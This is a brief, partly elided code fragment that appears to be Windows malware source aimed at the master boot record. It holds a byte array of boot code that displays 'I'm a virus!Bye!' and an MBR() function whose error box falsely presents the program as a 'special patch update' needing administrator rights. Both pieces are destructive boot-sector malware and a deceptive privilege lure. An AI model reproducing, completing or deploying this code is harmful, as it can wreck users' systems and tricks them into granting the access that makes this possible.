...
"\x00\xBA\x1D\x0E\xCD\x10\xE2\xFE\x0D\x0A\x49\x27\x6D\x20\x61\x20\x76\x69\x72\x75\x73\x21\x42\x79\x65\x21"; //"I'm a virus!Bye!"
...
DWORD MBR()
{
	...
	{
		MessageBoxA(NULL, "Error", "Please run as an administrator, otherwise Windows cannot install this special patch update.", MB_OK);
		return 0;
	}
